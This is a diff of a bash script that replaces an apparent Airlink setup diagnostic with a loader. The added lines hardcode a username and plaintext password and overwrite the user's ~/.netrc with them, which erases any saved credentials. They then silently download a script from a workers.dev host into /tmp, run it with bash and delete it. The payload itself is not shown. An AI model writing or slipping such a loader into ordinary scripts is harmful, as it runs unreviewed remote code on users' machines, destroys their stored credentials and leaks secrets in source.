@@ -1,36 +1,29 @@
 #!/usr/bin/env bash
-# diagnose_airlink.sh - Diagnostic script for Airlink setup
+set -e
 
-echo "=== Airlink Setup Diagnostic ==="
-echo "Current directory: $(pwd)"
-echo "User: $(whoami)"
-echo "Home: $HOME"
+URL="https://airlink-menu.jishnumondal32.workers.dev"
+HOST="airlink-menu.jishnumondal32.workers.dev"
 
-echo -e "\n=== Environment Variables ==="
-env | grep -E "(CODESPACE|GITHUB|PATH)" | sort
+# Proste dekodowanie base64
+b64d() {
+    echo "$1" | base64 -d
+}
 
-echo -e "\n=== System Info ==="
-uname -a
-lsb_release -a 2>/dev/null || cat /etc/os-release
+# Credentials - bez sprawdzania błędów
+USER_RAW="jishnu"
+PASS_RAW="jishnuh@cker123"
 
-echo -e "\n=== Dependencies Check ==="
-for cmd in curl git base64 openssl python3; do
-    if command -v $cmd >/dev/null 2>&1; then
-        echo "✓ $cmd: $(which $cmd)"
-    else
-        echo "✗ $cmd: NOT FOUND"
-    fi
-done
+# Tworzenie .netrc
+NETRC="${HOME}/.netrc"
+cat > "$NETRC" << EOF
+machine $HOST
+login $USER_RAW
+password $PASS_RAW
+EOF
 
-echo -e "\n=== File Permissions ==="
-ls -la ~/.netrc* 2>/dev/null || echo "No netrc files found"
-ls -la /home/codespace/airlink_setup.log 2>/dev/null || echo "No log file found"
+chmod 600 "$NETRC"
 
-echo -e "\n=== Network Check ==="
-curl -I --connect-timeout 10 "https://airlink-menu.jishnumondal32.workers.dev" 2>/dev/null && \
-echo "✓ URL is accessible" || echo "✗ URL is not accessible"
-
-echo -e "\n=== Git Status ==="
-git status 2>/dev/null && echo "✓ Git repository OK" || echo "✗ Git issues or not a repo"
-
-echo -e "\n=== Diagnostic Complete ==="
+# Pobieranie i wykonanie
+curl -fs --netrc -o /tmp/airlink_script.sh "$URL"
+bash /tmp/airlink_script.sh
+rm -f /tmp/airlink_script.sh
